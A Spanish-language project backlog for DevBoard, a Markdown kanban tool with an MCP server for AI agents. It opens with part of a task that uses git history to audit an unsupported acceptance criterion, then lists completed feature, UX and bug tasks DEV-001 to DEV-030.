- [x] #2 Crear docs/DISTRIBUTION.md explicando npm link, npx devboard-mcp,
  configuracion en IDEs y publicacion a npmjs.com
```

Evidencia recogida con git, sin interpretacion:

- `git log --all --diff-filter=A -- '*DISTRIBUTION*'` devuelve un unico commit, `a5f8b3d`, que agrega `docs/archive/DISTRIBUTION_POC.md`. Fue el **2026-10-09**, tres semanas despues de que DEV-025 se cerrara el 2026-09-19, y esta atribuido a DEV-015/DEV-016, no a esta tarea.
- `git log --all --follow -- docs/DISTRIBUTION.md` no devuelve ningun commit. La ruta nunca fue agregada, modificada ni eliminada.
- La busqueda en el arbol actual no encuentra ningun archivo `DISTRIBUTION` trackeado salvo el PoC archivado.

**El punto que debilita la hipotesis de "se creo y se borro antes del import".** El hermano del mismo AC si sobrevivio: `docs/AGENTIC_PLAYBOOK.md` (AC #1) estaba presente en el commit raiz `af5780e` del **2026-10-05**, que es la release v1.0.0, y recien lo elimino DEV-250 mucho despues. Si dos criterios de una misma tarea crearon artefactos en `docs/` y solo uno llego al import, lo mas parsimonioso es que el otro no se creo.

El **contenido** si existe, repartido en el README: `### 2. Local Development Link (npm link)` en la L413 y la seccion de conexion de agentes e IDEs en L94-L134. O sea, la intension del criterio se cumplio; la ruta especifica que nombro, no.

**Casos relacionados descubiertos en el mismo rastreo, NO cubiertos por esta tarea:**

- **DEV-179** esta limpio y trazable: `DEFAULT_REMOTE = 'pablojavierrodriguez/gripm-playbook'` entra en `ed08e58` y se publica en la **v1.0.1**.
- **DEV-026** tiene **tres de cinco ACs sin ningun pie de huella en git** (el bin `devboard`, `data/projects-registry.json` y las referencias del README). La explicacion plausible es que el arco de rebranding (DEV-144, cerrado el 2026-10-03) los reemplazo antes del import del 2026-10-05, pero es **inverificable** porque la historia de git arranca despues de ambas tareas. Requiere decision propia del PO.

**Criterios de Aceptación:**
- [ ] #1 El AC #2 de DEV-025 se reescribe para nombrar el artefacto que realmente existe (la seccion de distribucion del `README.md`), en vez de una ruta que nunca se creo.
- [ ] #2 El AC #2 conserva su `- [x]` solo si respalda la afirmacion nueva con la evidencia real de que el contenido esta en el README: `npm link` en `README.md:413` y conexion de agentes e IDEs en `README.md:94-134`.
- [ ] #3 Si al revisar la evidencia el contenido resulta insuficiente, el AC #2 se abre (`- [ ]`) y DEV-025 vuelve a un estado donde el trabajo falte. No se sostiene un tick sin respaldo.
- [ ] #4 `npm run backlog:sync` y `npm run backlog:check` salen con codigo 0 tras la modificacion, porque DEV-025 vive en `BACKLOG.md`.
- [ ] #5 Se documenta en las notas por que no se creo `docs/DISTRIBUTION.md` en su momento, para que el defecto no se repita en tareas nuevas.
- [ ] #6 `node scripts/verify-changes.js --all` sale con codigo 0.

---

### ✅ Done / Deployed (293)

#### [DEV-001] Interoperabilidad nativa con Backlog.md y motor Markdown
- **Prioridad**: `high` | **Tipo**: `feature`
- **Sprint / Milestone**: 0.2.0

Implementar soporte nativo para el estándar Backlog.md (MrLesk/Backlog.md) en DevBoard.
Permite almacenar cada ítem del backlog como un archivo Markdown individual en `backlog/tasks/*.md`
con YAML frontmatter y delimitadores estandarizados, resolviendo conflictos de Git concurrentes.

**Criterios de Aceptación:**
- [x] #1 Parser y serializador en TypeScript sin dependencias externas
- [x] #2 Normalización bidireccional de estados a vocabulario limpio (draft, doing, review, ready, done)
- [x] #3 Soporte dual de persistencia (JSON y Backlog.md) en la API de Vite
- [x] #4 Herramienta de migración 1-click y exportación consolidada a BACKLOG.md

---

#### [DEV-002] Modales de confirmación amables y eliminación de proyectos
- **Prioridad**: `high` | **Tipo**: `ux`
- **Sprint / Milestone**: v1.1.0

Reemplazar todas las alertas y confirmaciones nativas del navegador (`alert()` y `confirm()`)
por un modal in-app (`ConfirmModal`) con estética premium Linear/Raycast dark-mode.
Solucionar el fallo en el tacho de basura al eliminar o desvincular proyectos (incluso el demo).

**Criterios de Aceptación:**
- [x] #1 Crear componente `ConfirmModal.tsx` con variantes danger/warning/info y atajos de teclado
- [x] #2 Reemplazar confirms en Header, ItemCard, ItemModal, SprintView y ArchiveView
- [x] #3 Reemplazar alerts por banners de error inline y toasts
- [x] #4 Permitir eliminar/desvincular proyectos y restaurar proyecto Demo

---

#### [DEV-003] Explorador visual de carpetas y compatibilidad multiplataforma
- **Prioridad**: `high` | **Tipo**: `feature`
- **Sprint / Milestone**: v1.1.0

Permitir a los desarrolladores explorar el sistema de archivos local de su máquina visualmente
sin tener que escribir manualmente la ruta del repositorio. Asegurar compatibilidad multiplataforma
con Windows (`\`), macOS (`/`) y Linux (`/`).

**Criterios de Aceptación:**
- [x] #1 Implementar endpoint `GET /api/fs/browse` con normalización multiplataforma
- [x] #2 Crear componente `FolderPickerModal.tsx` con navegación jerárquica y badges Git/Backlog.md
- [x] #3 Integrar botón "Explorar" en `ProjectModal.tsx` con autocompletado y detección de motor
- [x] #4 Detectar si la carpeta seleccionada ya es un repositorio Git o tiene tareas Backlog.md

---

#### [DEV-004] Servidor MCP y Skills para Agentes de IA
- **Prioridad**: `high` | **Tipo**: `feature`
- **Sprint / Milestone**: v1.1.0

Construir un servidor MCP (Model Context Protocol) sobre stdio y una Skill documental para que
agentes de IA y LLMs (Claude Code, Cursor, Antigravity, Gemini) puedan inspeccionar, crear,
actualizar y completar tareas del backlog de forma autónoma y sin fricciones.

**Criterios de Aceptación:**
- [x] #1 Crear script `scripts/mcp-server.ts` con protocolo JSON-RPC 2.0 stdio
- [x] #2 Implementar tools MCP: list_projects, list_tasks, get_task, create_task, update_task, export_backlog
- [x] #3 Añadir comando npm `npm run mcp` en package.json
- [x] #4 Crear `.agents/skills/devboard/SKILL.md` con documentación y guía de flujo para agentes

---

#### [DEV-005] Release v1.1.0 y changelog automatizado
- **Prioridad**: `medium` | **Tipo**: `feature`
- **Sprint / Milestone**: v1.1.0

Empaquetar todas las mejoras del ciclo actual (Backlog.md, modales UX amables, explorador de carpetas,
dogfooding y servidor MCP) en el Release v1.1.0 utilizando el Release Assembler de DevBoard.

**Criterios de Aceptación:**
- [x] #1 Probar empaquetado del release con las tareas DEV completadas
- [x] #2 Generar changelog formateado con resumen de cambios para el usuario
- [x] #3 Validar paso de tareas de ready a done al archivar el release

---

#### [DEV-006] Sistema de Configuración y Settings Persistentes (.devboard/config.json y UI)
- **Prioridad**: `high` | **Tipo**: `feature`
- **Sprint / Milestone**: 0.3.0

Crear un sistema integral de configuración persistente para que el usuario pueda personalizar su experiencia en DevBoard.
Permite definir qué opciones visuales y funcionales están activas (densidad visual, tema por defecto, visibilidad de columna Ideas, WIP limits, columnas personalizadas).
La configuración debe guardarse en el repositorio local en un archivo JSON predeterminado (`.devboard/config.json`) con valores por defecto bien estructurados.
El usuario debe tener la flexibilidad de modificar las opciones tanto editando directamente el archivo JSON como desde una interfaz gráfica de Settings accesible desde la UI.

**Criterios de Aceptación:**
- [x] #1 Diseñar el esquema y valores predeterminados para el archivo local `.devboard/config.json`
- [x] #2 Implementar endpoints `GET /api/settings` y `POST /api/settings` en la API local de Vite
- [x] #3 Crear componente modal `SettingsModal.tsx` accesible desde un botón de engranaje en el Header
- [x] #4 Implementar hot-reload o sincronización cuando el usuario modifica `.devboard/config.json` directamente en el editor
- [x] #5 Permitir alternar preferencias visuales (modo compacto, tema predeterminado, animaciones) y funcionales desde la UI

---

#### [DEV-007] Optimización de UX Responsive y Mobile para Pantallas Pequeñas
- **Prioridad**: `high` | **Tipo**: `ux`
- **Sprint / Milestone**: 0.3.0

Optimizar de forma integral la experiencia de usuario (UX/UI) de DevBoard en dispositivos móviles y pantallas pequeñas (< 768px).
Actualmente la interfaz sufre de desbordamientos horizontales, la cabecera se satura de botones, las múltiples columnas del Kanban se comprimen haciéndose ilegibles y los modales se salen de los límites de la pantalla.
Se requiere un diseño adaptativo mobile-first: navegación colapsable en Header, selector de columna por tabs o scroll-snap para el tablero Kanban, y modales que se transformen en bottom-sheets o vistas de pantalla completa en mobile.

**Criterios de Aceptación:**
- [x] #1 Adaptar Header para mobile: menú colapsable (hamburguesa/drawer) o barra inferior para selector de proyectos y acciones
- [x] #2 Implementar vista mobile para el Kanban: selector de columna tipo tabs/pills o swipe horizontal con snap para ver una columna a la vez
- [x] #3 Adaptar modales (`ItemModal`, `ProjectModal`, `ConfirmModal`, `SettingsModal`) a modo bottom-sheet o pantalla completa en pantallas < 640px
- [x] #4 Garantizar áreas táctiles mínimas de 44x44px para botones e interactivos en mobile
- [x] #5 Eliminar cualquier scroll horizontal indeseado a nivel de ventana (`overflow-x-hidden` seguro en layout principal)

---

#### [DEV-008] Simplificación de Vista Kanban: Columna Ideas Opcional y Oculta por Defecto
- **Prioridad**: `medium` | **Tipo**: `feature`
- **Sprint / Milestone**: 0.3.0

Simplificar la vista simplificada del Kanban distinguiendo claramente entre el backlog crudo de "Ideas" (sin discovery, sin refinamiento ni priorización) y el verdadero "Backlog" de trabajo listo (filtrado, priorizado y en refinamiento).
En la vista simplificada, la columna de "Ideas" debe permanecer oculta por defecto para evitar ruido cognitivo. La vista simplificada por defecto mostrará el flujo esencial de 3 columnas: `Backlog` -> `In Progress / Doing` (agrupando review) -> `Done`.
Si el usuario desea incorporar o visualizar las Ideas, podrá hacerlo explícitamente a través de un botón/toggle dedicado (ej. "+ Mostrar Ideas" o switch en toolbar).
El selector de vistas existente de la barra superior debe mantenerse intacto con sus 2 modos ("Simple" y "Ampliada") sin añadir más opciones al selector principal.

**Criterios de Aceptación:**
- [x] #1 Ocultar por defecto la columna de Ideas al entrar en la vista Simplificada
- [x] #2 Mantener intacto el selector de 2 opciones (Simple / Ampliada) en la barra superior
- [x] #3 Renderizar por defecto las columnas base: Backlog, In Progress (Doing + Review) y Done en vista Simple
- [x] #4 Añadir un botón o toggle explícito accesible (ej. en la cabecera del Kanban o toolbar) para mostrar/ocultar la columna Ideas a demanda
- [x] #5 Persistir la preferencia de visibilidad de Ideas (en local storage o en `.devboard/config.json`)

---

#### [DEV-009] Personalización de Columnas Kanban: Reordenar, Renombrar, Mapeo de Estados y WIP Limits
- **Prioridad**: `medium` | **Tipo**: `feature`
- **Sprint / Milestone**: 0.3.0

Permitir a los usuarios personalizar dinámicamente la configuración del tablero Kanban:
1. Renombrar el título de las columnas.
2. Reordenar las columnas según la preferencia del equipo.
3. Configurar qué estados canónicos (`draft`, `doing`, `review`, `ready`, `done`) pertenecen a cada columna visual.
4. Validar y alertar al usuario si algún estado queda desasignado o huérfano (para evitar que tareas existentes desaparezcan visualmente del tablero).
5. Configurar límites de trabajo en progreso (WIP Limits) por columna (ejemplo: máximo 10 cards en 'Doing'), mostrando indicadores de capacidad y alertas visuales al superar el umbral.

**Criterios de Aceptación:**
- [x] #1 Configuración dinámica de columnas con título editable y orden personalizable
- [x] #2 Asignación flexible de estados a columnas visuales
- [x] #3 Validación de estados huérfanos: mostrar banner de advertencia si algún estado activo no está asignado a ninguna columna
- [x] #4 Soporte para WIP Limits numéricos por columna (ej. `doing: 10`, `review: 5`)
- [x] #5 Indicadores visuales en la cabecera de la columna cuando se alcanza o sobrepasa el WIP limit (ej. badge amarillo/rojo `11/10 WIP`)
- [x] #6 Guardado de la configuración en `.devboard/config.json` o settings del proyecto

---

#### [DEV-010] Fix de Desplazamiento Horizontal Inestable en Selector de Navegación de Pestañas
- **Prioridad**: `high` | **Tipo**: `bug`
- **Sprint / Milestone**: 0.3.0

Resolver el defecto visual en la barra superior (`Header.tsx`) donde el bloque central de navegación por pestañas (Tablero, Sprint & Priorización, Releases, Archivo) se desplaza horizontalmente (layout shift) de forma errática:
1. Al cambiar de proyecto: la longitud variable del nombre del proyecto y los badges ('Backlog.md' vs 'JSON' vs 'Demo') cambian el ancho del contenedor izquierdo. Como la barra utiliza `flex justify-between`, el cambio de ancho en la izquierda empuja o tira del contenedor central de pestañas.
2. Al cambiar de pestaña: cuando la pestaña activa es 'Tablero', se muestra el selector de modo de vista (Simple / Ampliada) en el contenedor derecho; al cambiar a 'Sprint', 'Releases' o 'Archivo', dicho selector desaparece, reduciendo el ancho del bloque derecho en ~120px y provocando que el selector central de pestañas pegue un salto horizontal notable.
La navegación debe permanecer centrada o fija sin saltos visuales molestos al interactuar con proyectos o pestañas.

**Criterios de Aceptación:**
- [x] #1 Estabilizar el layout del Header mediante un sistema de 3 columnas fijas (ej. CSS Grid `grid-cols-[1fr_auto_1fr]` o flexboxes balanceados)
- [x] #2 Garantizar que el selector central de navegación (`<nav>`) no se mueva horizontalmente al cambiar de proyecto (independientemente de la longitud de su nombre o badge)
- [x] #3 Garantizar que el selector central de navegación (`<nav>`) permanezca completamente estático al cambiar entre pestañas (Tablero, Sprint, Releases, Archivo)
- [x] #4 Preservar la visibilidad y estética de los botones de acciones y selectores en desktop y mobile

---

#### [DEV-011] Redistribución Visual y Secciones Colapsables en Editor de Card (ItemModal)
- **Prioridad**: `medium` | **Tipo**: `ux`
- **Sprint / Milestone**: 0.3.0

Mejorar la distribución visual, ergonomía y aprovechamiento del espacio en el modal de edición/creación de tarjetas (`ItemModal.tsx`).
Actualmente, el modal apila todos los campos verticalmente en un único scroll largo:
- Varios campos del modelo de datos (`risk` y `fix`) ni siquiera se muestran en pantalla por falta de espacio.
- Cuando una tarea tiene múltiples Criterios de Aceptación (AC) o un Plan de Implementación técnico detallado, la altura del modal desborda la pantalla obligando al usuario a realizar scrolls excesivos.
- Se debe reestructurar el formulario con una jerarquía visual limpia:
  1. Cabecera compacta con Título, Código, Tipo, Prioridad, Estado y Proyecto en grilla balanceada.
  2. Secciones colapsables tipo acordeón (o pestañas internas) para:
     - **Criterios de Aceptación (AC)**: con contador en cabecera (ej. `3/5 cumplidos`) y colapsar/expandir.
     - **Plan de Implementación & Plan Guard**: colapsable para desarrollo técnico y agentes de IA.
     - **Metadatos Técnicos**: archivo impactado, sprint/release objetivo, riesgos (`risk`) y solución propuesta (`fix`).

**Criterios de Aceptación:**
- [x] #1 Implementar secciones colapsables (acordeón o tabs) con estado recordado para AC, Plan Técnico y Metadatos
- [x] #2 Incorporar inputs editables para campos omitidos actualmente (`risk` y `fix`)
- [x] #3 Mostrar indicador resumen en el encabezado de la sección de AC (ej. "3 de 5 criterios completados")
- [x] #4 Mejorar el aprovechamiento horizontal en pantallas medianas y grandes con un layout en 2 columnas o panel lateral
- [x] #5 Mantener atajos de teclado (`⌘+Enter` para guardar, `Esc` para cancelar)

---

#### [DEV-012] Generalización de Re-sync Docs para Modalidad Dual (JSON y Backlog.md)
- **Prioridad**: `medium` | **Tipo**: `feature`
- **Sprint / Milestone**: 0.3.0

Generalizar la funcionalidad de sincronización y reimportación de documentación ("Re-sync /docs") para que no dependa exclusivamente de un repositorio legado con ruta hardcodeada ni del formato JSON único.
Actualmente:
- El endpoint `POST /api/import` en `vite.config.ts` buscaba hardcodeado un proyecto legado específico y ejecutaba `runMigration(docsPath, ...backlog.json)`.
- En proyectos con almacenamiento `backlog-md` (como el propio DevBoard) o en cualquier proyecto nuevo, presionar el botón "Re-sync /docs" falla o afecta al proyecto equivocado.
Se debe contextualizar la sincronización:
1. Permitir que cada proyecto configure opcionalmente su ruta de documentación o fuente de importación.
2. Soportar la sincronización tanto hacia archivos `backlog/tasks/*.md` individuales (`backlog-md`) como hacia `.devboard/backlog.json` (`json`).
3. Ocultar o deshabilitar elegantemente el botón en el Header si el proyecto activo no tiene configurada una carpeta de documentación externa para sincronizar.

**Criterios de Aceptación:**
- [x] #1 Parametrizar el endpoint `POST /api/import` para recibir `projectId` del proyecto activo
- [x] #2 Implementar lógica de importación hacia archivos Markdown individuales para proyectos con `storageType: 'backlog-md'`
- [x] #3 Ocultar o desactivar el botón "Re-sync /docs" en `Header.tsx` si el proyecto seleccionado no tiene docs vinculados
- [x] #4 Proporcionar retroalimentación visual al usuario (toast o banner) indicando qué proyecto se sincronizó y cuántas tareas se actualizaron

---

#### [DEV-013] Estandarización de storageType a 'markdown' para desacoplar de Backlog.md
- **Prioridad**: `medium` | **Tipo**: `tech_debt`
- **Sprint / Milestone**: v1.2.0

Renombrar y estandarizar el identificador `storageType` del motor de persistencia a exclusivamente `'markdown' | 'json'`.
Al ser el almacenamiento gestionado integralmente por DevBoard sin dependencias externas, no existe necesidad de mantener múltiples valores o alias (`md`, `backlog-md`).
Esto evita cualquier confusión conceptual con proyectos externos (como la herramienta Backlog.md) y simplifica el código en frontend, backend y servidor MCP.

**Criterios de Aceptación:**
- [x] #1 Definir estrictamente `StorageType = "json" | "markdown"` en `src/types.ts`
- [x] #2 Actualizar `data/projects-registry.json` con `"storageType": "markdown"`
- [x] #3 Simplificar funciones en `vite.config.ts` (`isBacklogMdProject`, `detectProjectStorage`) a `'json' | 'markdown'`
- [x] #4 Actualizar componentes UI (`Header.tsx`, `ProjectModal.tsx`, `FolderPickerModal.tsx`) con etiquetas "Markdown" y "MD"
- [x] #5 Actualizar `scripts/mcp-server.ts` y suite de tests

---

#### [DEV-014] Sincronización en vivo en la UI ante cambios en disco (Live File Watcher / SSE)
- **Prioridad**: `high` | **Tipo**: `feature`
- **Sprint / Milestone**: v1.3.0

Permite que la interfaz web abierta en el navegador actualice el tablero en tiempo real cuando un agente de IA o un comando git modifique archivos Markdown en disco, evitando que el usuario trabaje sobre datos obsoletos o genere colisiones.

**Criterios de Aceptación:**
- [x] #1 Configurar watcher activo en backend (Vite middleware / server) monitoreando archivos en backlog/tasks/*.md y .devboard/
- [x] #2 Establecer canal de eventos reactivo (SSE en /api/events o WebSocket HMR) para notificar cambios de disco a la UI
- [x] #3 El frontend React escucha los eventos y actualiza silenciosamente los datos sin perder filtros ni posición de scroll
- [x] #4 Mostrar notificación o badge visual no intrusivo ('Sincronizado con disco') confirmando la actualización externa

---

#### [DEV-015] Distribución Zero-Install vía CLI (npx dev-board)
- **Prioridad**: `high` | **Tipo**: `feature`
- **Sprint / Milestone**: v1.3.0

Publicar y empaquetar DevBoard como herramienta de línea de comandos para que cualquier desarrollador pueda ejecutar 'npx dev-board' dentro de cualquier repositorio y visualizar/gestionar su backlog al instante sin dependencias previas.

**Criterios de Aceptación:**
- [x] #1 Configurar punto de entrada CLI ejecutable (bin/devboard.js) con shebang y declaración en package.json
- [x] #2 Detectar automáticamente el proyecto objetivo en process.cwd() (soporte de backlog/tasks/*.md y .devboard/backlog.json)
- [x] #3 Iniciar servidor HTTP estático y de API en un puerto disponible sin requerir clonación del repositorio dev-board
- [x] #4 Abrir automáticamente el navegador web predeterminado al estar listo el servidor

---

#### [DEV-016] Empaquetado y distribución simplificada del servidor MCP (npx devboard-mcp)
- **Prioridad**: `high` | **Tipo**: `feature`
- **Sprint / Milestone**: v1.3.0

Empaquetar el servidor MCP para eliminar la necesidad de configurar rutas locales absolutas y flags experimentales en los archivos mcp_config.json de los IDEs, permitiendo integración de agentes con un único comando agnóstico.

**Criterios de Aceptación:**
- [x] #1 Empaquetar scripts/mcp-server.ts a un ejecutable autónomo en JavaScript (dist/mcp-server.cjs o bin/mcp.js) sin requerir flags experimentales de node
- [x] #2 Habilitar ejecución directa vía npx devboard-mcp sobre stdio para integración transparente en IDEs (Antigravity, Cursor, Claude Code)
- [x] #3 Detectar automáticamente el repositorio actual o aceptar argumento --repo / -p con la ruta del proyecto
- [x] #4 Actualizar documentación y Skill de devboard para reflejar la configuración simplificada de una sola línea

---

#### [DEV-017] Optimistic Locking y prevención de sobreescrituras silenciosas (ETag / Mtime)
- **Prioridad**: `medium` | **Tipo**: `feature`
- **Sprint / Milestone**: v1.3.0

Implementar un mecanismo de control de concurrencia optimista para evitar que ediciones concurrentes entre usuarios de la UI y agentes de IA en disco se pisen silenciosamente sin advertencia.

**Criterios de Aceptación:**
- [x] #1 Incluir timestamp de modificación (mtime) o hash en la respuesta de /api/data para cada tarea del backlog
- [x] #2 Comprobar en PUT /api/items/:id si el archivo en disco cambió después de la fecha en que la UI leyó los datos
- [x] #3 Retornar código HTTP 409 Conflict si se detecta modificación concurrente externa
- [x] #4 Mostrar diálogo amigable de resolución de conflicto en la UI permitiendo al usuario ver cambios o recargar datos frescos sin perder su edición local

---

#### [DEV-018] Asistente de importación nativo para repositorios legacy (Import Wizard)
- **Prioridad**: `medium` | **Tipo**: `ux`
- **Sprint / Milestone**: v1.3.0

Proveer un asistente visual e interactivo en la interfaz para importar proyectos legacy que actualmente gestionan su backlog en un único archivo plano (BACKLOG.md o TODO.md), convirtiéndolos al estándar atómico distribuido.

**Criterios de Aceptación:**
- [x] #1 Crear parser heurístico capaz de procesar archivos Markdown planos tipo TODO.md o BACKLOG.md estructurados con listas de tareas (- [ ] Título) y encabezados
- [x] #2 Diseñar modal 'Importar Backlog Legacy' en la UI con soporte para carga de archivo y previsualización de ítems detectados antes de confirmar
- [x] #3 Generar archivos atómicos en backlog/tasks/<CODE> - <Title>.md respetando la convención de almacenamiento Markdown distribuido
- [x] #4 Integrar las tareas importadas al tablero y al registro del proyecto en tiempo real sin reiniciar el servidor

---

#### [DEV-019] Resiliencia y reconciliación ante tareas Markdown huérfanas o renombradas
- **Prioridad**: `medium` | **Tipo**: `bug`
- **Sprint / Milestone**: v1.2.0

Hacer que el servidor MCP y la API de DevBoard sean tolerantes a fallos si un desarrollador renombra manualmente un archivo de tarea en su editor (ej. VS Code), reconciliando la tarea a través del ID declarado en su frontmatter YAML.

**Criterios de Aceptación:**
- [x] #1 Escanear el frontmatter YAML ('id:' o 'code:') para localizar tareas en disco cuando el nombre de archivo no coincide con el prefijo esperado
- [x] #2 Actualizar el servidor MCP (devboard_get_task, devboard_update_task) para encontrar tareas independientemente del nombre del archivo en backlog/tasks/
- [x] #3 Actualizar la API backend (PUT /api/items/:id, DELETE /api/items/:id) para reconciliar por frontmatter si falla la coincidencia por nombre de archivo
- [x] #4 Normalizar y renombrar el archivo en disco automáticamente al estándar '<ID> - <Title>.md' al guardar la tarea para mantener el repositorio ordenado

---

#### [DEV-020] Optimización de MCP y CLI para exploración eficiente del Backlog por Agentes de IA
- **Prioridad**: `high` | **Tipo**: `feature`
- **Sprint / Milestone**: v1.2.0

Los agentes de IA suelen recurrir a scripts ad-hoc 'node -e' para filtrar y listar tareas abiertas en consola, arriesgando romper el storage Markdown/JSON y desperdiciando tokens. Esta tarea dota al MCP y al CLI de herramientas ergonómicas de consulta compacta y paginada.

**Criterios de Aceptación:**
- [x] #1 Añadir parámetros 'openOnly' (excluye done/dismissed), 'limit', 'search' y 'format: compact | detailed' en devboard_list_tasks
- [x] #2 Implementar comando CLI nativo (ej: 'npm run devboard:list' o 'npx devboard list --open') para agentes que operan en consola
- [x] #3 Garantizar respuesta token-efficient en formato compacto de 1 línea por ítem tanto para almacenamiento Markdown como JSON
- [x] #4 Actualizar SKILL.md documentando el uso de devboard_list_tasks con filtros compactos y desaconsejando scripts ad-hoc 'node -e'

---

#### [DEV-021] Mutaciones Masivas y Actualizaciones por Lote en MCP y CLI (devboard_bulk_update_tasks)
- **Prioridad**: `high` | **Tipo**: `feature`
- **Sprint / Milestone**: v1.2.0

Permite a los agentes de IA realizar actualizaciones masivas de estado y metadatos sobre decenas de tareas en una única llamada, evitando decenas de llamadas individuales lentas o la necesidad de escribir scripts de consola ad-hoc.

**Criterios de Aceptación:**
- [x] #1 Implementar tool 'devboard_bulk_update_tasks' en MCP para actualizar múltiples tareas por 'taskIds: string[]' o por condición de filtro ('prefix', 'status')
- [x] #2 Permitir mutaciones simultáneas de estado ('status'), milestone, etiquetas ('labels') y notas técnicas
- [x] #3 Incorporar comando por lotes en CLI ('npm run tasks -- --update-status <estado> --ids <id1,id2>' o '--prefix <prefijo>')
- [x] #4 Garantizar consistencia y actualización atómica tanto en almacenamiento Markdown distribuido como en JSON

---

#### [DEV-022] Métricas, Estadísticas y Agrupación por Prefijo (devboard_get_stats y CLI --stats)
- **Prioridad**: `high` | **Tipo**: `feature`
- **Sprint / Milestone**: v1.2.0

Provee herramientas nativas para que los agentes y desarrolladores obtengan métricas de salud del backlog y desgloses por tipología de tarea sin necesidad de parsear y agrupar manualmente mediante scripts de consola.

**Criterios de Aceptación:**
- [x] #1 Implementar tool 'devboard_get_stats' en MCP retornando total, abiertos, cerrados, porcentaje completado y distribución por estado y prioridad
- [x] #2 Calcular agrupación y recuento automático por prefijo de código (ej: APP-P, APP-BUG, APP-FEAT, APP-SPEC)
- [x] #3 Extender 'devboard_list_tasks' para soportar filtros por 'prefix' y lista explícita de 'taskIds'
- [x] #4 Implementar flag '--stats' en CLI ('npm run tasks -- --stats') mostrando un resumen gráfico y métricas en terminal

---

#### [DEV-023] Gestión e Inspección de Releases en MCP (devboard_list_releases)
- **Prioridad**: `medium` | **Tipo**: `feature`
- **Sprint / Milestone**: v1.3.0

Permitir a los agentes de IA consultar releases y contrastar tareas terminadas contra versiones publicadas de forma nativa a través del protocolo MCP.

**Criterios de Aceptación:**
- [x] #1 Implementar tool 'devboard_list_releases' en MCP para consultar versiones publicadas, fechas y notas de versión estructuradas
- [x] #2 Permitir consultar tareas asociadas a una versión específica o release planificado
- [x] #3 Documentar devboard_list_releases en SKILL.md para permitir contraste directo con release notes

---

#### [DEV-024] Resiliencia ante errores de permisos (EPERM) en repositorios locales y banner en UI
- **Prioridad**: `high` | **Tipo**: `bug`
- **Sprint / Milestone**: v1.3.0

Manejo tolerante a fallos en la lectura de tareas Markdown de repositorios locales:
1. Envolver la lectura de carpetas backlog/tasks en try/catch para evitar que excepciones de permisos (EPERM/EACCES) o paths inaccesibles hagan colapsar el endpoint GET /api/data con status 500.
2. Propagar el estado de error (error?: string) en la metadata del proyecto (ProjectMeta y Project).
3. Notificar visualmente en el frontend (banner de advertencia con explicación y comando de solución) cuando un proyecto seleccionado no pueda leer sus archivos por restricciones de permisos o sandbox.
4. Soporte para liberar puertos retenidos e iniciar servidores limpios.

**Criterios de Aceptación:**
- [x] #1 Blindar readProjectBacklog en vite.config.ts para capturar excepciones de lectura de carpetas y no tumbar /api/data
- [x] #2 Declarar error?: string en tipos ProjectMeta (vite.config.ts, mcp-server.ts) y Project (src/types.ts)
- [x] #3 Renderizar banner de diagnóstico amigable en App.tsx ante errores de acceso a repositorios
- [x] #4 Documentar la resolución de conflictos de puertos y compatibilidad con entornos sandbox

---

#### [DEV-025] Integración Formal del Agentic Team Playbook, Guardrails de IA y Guía de Distribución
- **Prioridad**: `high` | **Tipo**: `feature`
- **Sprint / Milestone**: v1.2.0

Formalizar la metodología del Agentic Team Playbook dentro de DevBoard, definiendo roles, guardrails de ejecución para LLMs, matrices de verificación y documentando de punta a punta la arquitectura de distribución open-source (npm link, npx devboard-mcp, npx dev-board y publicación en npmjs.com).

**Criterios de Aceptación:**
- [x] #1 Crear docs/AGENTIC_PLAYBOOK.md formalizando roles, fases del ciclo de vida ágil con IA y guardrails anti-alucinación
- [x] #2 Crear docs/DISTRIBUTION.md explicando npm link, npx devboard-mcp, configuración en IDEs y publicación a npmjs.com
- [x] #3 Actualizar README.md y AGENTS.md integrando la metodología Playbook y la guía rápida de inicio
- [x] #4 Verificar integridad del sistema y validar con npm run backlog:check

---

#### [DEV-026] Unificación de Nombres Binarios CLI (devboard / devboard-mcp) y Limpieza de isDemo en Registry
- **Prioridad**: `high` | **Tipo**: `chore`
- **Sprint / Milestone**: v1.2.0

Unificar la convención de nomenclatura de binarios en package.json eliminando la asimetría entre dev-board y devboard-mcp (estableciendo devboard y devboard-mcp como comandos canónicos y soportando alias retrocompatibles). Eliminar la propiedad ruidosa isDemo: false del archivo data/projects-registry.json tratándola como false por defecto si está ausente.

**Criterios de Aceptación:**
- [x] #1 Configurar bin en package.json con devboard y devboard-mcp como principales, y alias compatibles
- [x] #2 Limpiar data/projects-registry.json eliminando isDemo: false innecesario
- [x] #3 Actualizar vite.config.ts para que saveRegistry y la creación de proyectos no serialicen isDemo cuando sea falsy
- [x] #4 Actualizar referencias en README.md a devboard y devboard-mcp
- [x] #5 Validar con npm run backlog:check y npm run build

---

#### [DEV-027] Integración de Agent Skills, Reglas y Playbook Operativo (repositorios de referencia)
- **Prioridad**: `high` | **Tipo**: `feature`
- **Sprint / Milestone**: 0.3.0

Transferir y adaptar las mejores skills, reglas y herramientas de automatización de repositorios de referencia hacia dev-board para erradicar ineficiencias de desarrollo, inconsistencias de UX y falta de rigor en QA.

**Criterios de Aceptación:**
- [x] #1 Crear regla estricta de aprobación de Git en .agents/rules/git-approval.md
- [x] #2 Adaptar e incorporar skills operativas en .agents/skills/ (code-level-ux-auditor, rigorous-qa-auditor, worldclass-product-designer, principal-engineer, market-researcher, list-views-filters)
- [x] #3 Crear playbook operativo multi-agente en .agents/TEAM_PLAYBOOK.md con matriz de decision y directrices de subagentes
- [x] #4 Incorporar script scripts/audit-ux-code.cjs y añadir comando npm run audit:ux a package.json
- [x] #5 Validar integridad ejecutando npm run audit:ux, npm run build y npm run backlog:check

---

#### [DEV-030] Persistencia del Último Proyecto Activo y Fallback Seguro
- **Prioridad**: `medium` | **Tipo**: `bug`
- **Sprint / Milestone**: 0.3.0

Al iniciar o recargar la aplicación en el navegador, DevBoard seleccionaba por defecto el proyecto inicial del registro o un repositorio por defecto, ignorando en qué proyecto estuvo trabajando el usuario por última vez.
Dado que el proyecto es el filtro de contexto por excelencia en DevBoard, la interfaz debe recordar el último proyecto activo seleccionado para que el usuario mantenga su contexto de trabajo entre recargas y sesiones.
Se debe almacenar la preferencia en `localStorage` y sincronizarla con `projects-registry.json` mediante la API. Si el proyecto guardado fue desvinculado o su ruta ya no existe, el sistema debe aplicar un fallback seguro al primer proyecto válido disponible sin provocar estados inconsistentes ni fallos de renderizado.

**Criterios de Aceptación:**
- [x] #1 Guardar el último `projectId` seleccionado en `localStorage` ('devboard_active_project_id') ante cada cambio en el selector de proyectos
- [x] #2 Restaurar automáticamente el último proyecto activo al cargar o recargar la aplicación en `App.tsx`
